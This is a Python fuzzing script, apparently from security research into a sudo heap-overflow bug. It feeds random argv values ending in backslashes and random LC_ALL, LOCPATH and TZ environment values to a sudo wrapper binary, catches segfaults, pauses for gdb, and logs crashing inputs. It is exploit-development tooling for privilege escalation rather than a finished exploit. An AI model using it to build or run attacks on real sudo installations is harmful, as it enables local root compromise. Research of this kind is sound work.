import json
import subprocess
import sys
import os
import random
import utils
import time
import os
from pathlib import Path

NEXT = "22223333"
#LIBRARY = "00001111"
#KNOWN = "AAAABBBB"
NAME = "XXXX/liveoverflow"

# taken from fengshui
#_SIZES = [i for i in range(0,0x1ff)]
_SIZES = [i for i in range(0,0xfff, 8)]
_SIZES += [2**i for i in range(0,15)]
_SIZES += [(2**i)+1 for i in range(0,15)]
_SIZES += [(2**i)-1 for i in range(0,15)]

ALPHABET = '0123456789ABCDEFGHIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'


def run_sudo_check_crash(arg):
    args = ["/usr/bin/stdbuf","-o0","/pwd/sudoenv2"] + arg
    p = subprocess.Popen(args, bufsize=0,
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        lines = p.communicate(b"x\nx\nx\nx\n",timeout=1)
    except subprocess.TimeoutExpired:
        p.terminate()

    if p.returncode == -11:
        return True
    return False

def run_sudo_waitgdb(arg):
    args = ["/usr/bin/stdbuf","-o0","/pwd/sudoenv3"] + arg
    p = subprocess.Popen(args, bufsize=0,
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    utils.set_state(f'pid:{p.pid}')
    while utils.get_state() != 'continue':
        #print('waiting for continue...')
        time.sleep(1)
    print("received continue...")
    try:
        lines = p.communicate(b"x\nx\nx\nx\n",timeout=5)
        print(lines)
    except subprocess.TimeoutExpired:
        p.terminate()
        print('terminated')


while True:
    ARGV_1 = random.choice(ALPHABET)*random.choice(_SIZES)
    ENV_KEY = random.choice(ALPHABET)*random.choice(_SIZES)
    ENV_VAR = random.choice(ALPHABET)*random.choice(_SIZES)
    LC_ALL = random.choice(ALPHABET)*random.choice(_SIZES)
    LOCPATH = random.choice(ALPHABET)*random.choice(_SIZES)
    TZ = random.choice(ALPHABET)*random.choice(_SIZES)

    arg = [
        # used for argv[1]: -s AAAAAA\ 
        ARGV_1+"\\",
        # used as env[]
        ENV_VAR+
        "\\","\\","\\","\\","\\","\\","\\","\\", # LIBRARY
        "\\","\\","\\","\\","\\","\\","\\","\\", # KNOWN
        NAME+"\\",
        ENV_KEY
    ]

    if random.randint(0,3):
        arg += ["LC_ALL="+LC_ALL]
    if random.randint(0,3):
        arg += ["LOCPATH="+LOCPATH]
    if random.randint(0,3):
        arg += ["TZ="+TZ]

    if run_sudo_check_crash(arg):
        print('------------------- segfault')
        utils.set_state('segfault')
        run_sudo_waitgdb(arg)
        while True:
            state = utils.get_state()
            #print(f'waiting for done... {state}')
            if state.startswith('done'):
                print(f'received {state}...')
                if len(state[5:])>5:
                    fname = f'asd5/segfault:{state[5:]}.json'
                    if os.path.isfile(fname) and Path(fname).stat().st_size > 200000:
                        pass
                    else:
                        with open(fname,'a') as f:
                            f.write(json.dumps(arg)+"\n")
                break
            time.sleep(0.1)
        
